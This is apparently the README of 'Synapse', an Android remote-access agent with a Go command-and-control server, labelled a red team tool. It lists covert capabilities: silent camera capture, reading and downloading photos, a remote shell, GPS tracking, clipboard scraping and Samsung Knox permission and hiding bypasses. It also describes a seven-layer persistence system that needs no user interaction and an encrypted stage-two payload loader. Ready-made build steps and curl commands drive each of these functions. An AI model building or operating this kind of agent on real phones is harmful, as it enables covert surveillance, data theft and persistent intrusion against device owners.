# Synapse — Android 16 Red Team Agent

> Production-grade Kotlin agent with GoFrame C2 server.  
> Android 16 · One UI 8.5 · Samsung Galaxy · Zero-touch auto-start.

---

## Architecture

```
UMBRA/
├── Umbra-Client/          # Android Kotlin Agent
│   ├── app/src/main/java/org/synapse/core/
│   │   ├── core/           # Crypto, Engine, Sandbox, StageLoader
│   │   ├── c2/             # WebSocket, FCM, Command dispatch
│   │   ├── modules/        # Camera, Files, Shell, Location, Knox exploits
│   │   └── persistence/    # 7-layer auto-start system
│   └── ...
├── Umbra-Server/           # GoFrame v2 C2 Server
│   └── synapse-c2/
│       ├── internal/
│       │   ├── controller/ # REST + WebSocket handlers
│       │   └── service/    # Crypto, device registry, broadcast
│       └── resource/public/
│           └── index.html  # Multi-panel dashboard
└── README.md
```

| Component | Stack |
|---|---|
| **Agent** | Kotlin 2.2 · Jetpack Compose · OkHttp · WorkManager · Camera2 |
| **Server** | Go 1.24 · GoFrame v2.10 · gorilla/websocket |
| **Crypto** | AES-256-GCM (all C2 traffic encrypted) |
| **Dashboard** | Single-file HTML · CSS Grid · SSE real-time · Leaflet maps |

---

## Capabilities

| Module | Command | Description |
|---|---|---|
| **Ping** | `ping/ping` | Latency check |
| **Device Info** | `info/gather` | Model, brand, SDK, Android ID, fingerprint |
| **File Browser** | `files/list` `files/read` | Enumerate & download photos/videos via MediaStore |
| **Shell** | `shell/exec` | Remote command execution |
| **Camera** | `camera/capture` | Silent photo capture (Camera2 API) |
| **Location** | `location/get` | GPS coordinates |
| **Samsung Exploits** | `semclipboard/scrape` `silent_grant/grant` `knox_hide/hide` | Binder bypass for Samsung system services |

---

## Auto-Start System (Zero-Touch)

The agent starts automatically — no user interaction required.

| Layer | Trigger | Latency |
|---|---|---|
| ContentProvider | APK install/update | Instant |
| Package Replaced | APK update | Instant |
| AlarmManager watchdog | Every 5 minutes | ≤ 5 min |
| JobScheduler backup | Every 15 minutes | ≤ 15 min |
| Boot Completed | Device reboot | ~10 seconds |
| Network Change | WiFi/mobile connect | Instant |
| Power Connected | Charger plugged in | Instant |

---

## Quick Start

### Prerequisites

- Go 1.24+ (`/home/hp/go/bin/go`)
- Android SDK with API 37
- ADB with device connected

### 1. Build & Start C2 Server

```bash
export PATH="$HOME/go/bin:$HOME/go-projects/bin:$PATH"
cd UMBRA/Umbra-Server/synapse-c2/app/synapse-c2
go build -o /tmp/synapse-server .
fuser -k 8443/tcp
/tmp/synapse-server
```

### 2. Build & Install Agent

```bash
cd UMBRA/Umbra-Client
export JAVA_HOME=~/.local/share/JetBrains/Toolbox/apps/android-studio/jbr
./gradlew assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

The agent starts immediately after install — no click needed.

### 3. Grant Permissions

```bash
adb shell pm grant org.synapse.core android.permission.POST_NOTIFICATIONS
adb shell pm grant org.synapse.core android.permission.CAMERA
adb shell pm grant org.synapse.core android.permission.ACCESS_FINE_LOCATION
adb shell pm grant org.synapse.core android.permission.READ_MEDIA_IMAGES
adb shell pm grant org.synapse.core android.permission.READ_MEDIA_VIDEO
adb shell pm grant org.synapse.core android.permission.READ_PHONE_STATE
```

### 4. Open Dashboard

Navigate to `https://localhost:8443` — accept the self-signed certificate.

---

## Testing Guide

### Verify Connection

```bash
curl -k https://localhost:8443/api/devices
```

Expected: `{"count":1,"devices":[{"id":"a2a99ec51033f84f","online":true,...}]}`

### Ping

```bash
curl -k -X POST https://localhost:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"a2a99ec51033f84f","module":"ping","action":"ping"}'
```

### Device Information

```bash
curl -k -X POST https://localhost:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"a2a99ec51033f84f","module":"info","action":"gather"}'
```

Returns: model, brand, SDK version, Android ID, build fingerprint.

### File Browser

```bash
# List 5 most recent photos
curl -k -X POST https://localhost:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"a2a99ec51033f84f","module":"files","action":"list","params":{"type":"images","count":"5"}}'

# Read a specific file (base64 encoded)
curl -k -X POST https://localhost:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"a2a99ec51033f84f","module":"files","action":"read","params":{"id":"1000116703","type":"images"}}'
```

### Remote Shell

```bash
curl -k -X POST https://localhost:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"a2a99ec51033f84f","module":"shell","action":"exec","params":{"cmd":"id"}}'
```

### Location

```bash
curl -k -X POST https://localhost:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"a2a99ec51033f84f","module":"location","action":"get"}'
```

Requires GPS enabled on device.

### Camera Capture

```bash
curl -k -X POST https://localhost:8443/api/command \
  -H "Content-Type: application/json" \
  -d '{"device_id":"a2a99ec51033f84f","module":"camera","action":"capture"}'
```

Note: Samsung Knox may block camera on non-system apps (`CAMERA_DISABLED by policy`).

### Dashboard Interaction

Open `https://localhost:8443` in browser:

1. **Devices** (left sidebar) — click device to select
2. **Live Feed** — real-time results as they arrive
3. **Command Console** — quick-action buttons or manual module/action/params
4. **File Browser** — grid of photo thumbnails, click to view full-size
5. **Camera** — captured images gallery
6. **Shell** — terminal-style command execution
7. **Map** — GPS position with Leaflet markers

Keyboard shortcuts: `Ctrl+Enter` send, `Ctrl+1-6` switch tabs, `Esc` close modals.

### Verify Persistence

```bash
# Check foreground service
adb shell dumpsys activity services org.synapse.core | grep foreground

# Simulate Doze
adb shell dumpsys deviceidle force-idle
sleep 10
adb shell dumpsys activity services org.synapse.core | grep foreground
# Should still show: foreground=true

# Test reboot recovery
adb reboot
# ... wait for device to restart, reconnect ADB ...
adb shell dumpsys activity services org.synapse.core | grep foreground
# Should auto-restart via BootReceiver + WorkManager
```

---

## Server API

| Endpoint | Method | Description |
|---|---|---|
| `/` | GET | Dashboard |
| `/api/health` | GET | Server status + device counts |
| `/api/devices` | GET | List all devices |
| `/api/command` | POST | Queue command `{device_id, module, action, params}` |
| `/api/events` | GET | SSE stream for real-time results |
| `/api/result` | POST | HTTP fallback for results |
| `/api/register-fcm` | POST | Register FCM token |
| `/api/stage2` | GET | Serve encrypted Stage 2 DEX |
| `/c2` | WS | WebSocket for agent connections |

---

## Notes

- All C2 traffic is AES-256-GCM encrypted
- TLS is self-signed — accept in browser
- FCM push requires `firebase-admin-key.json` in server directory (optional)
- Samsung devices may block camera for non-system apps
- The dashboard auto-fetches image thumbnails via the `files/read` API
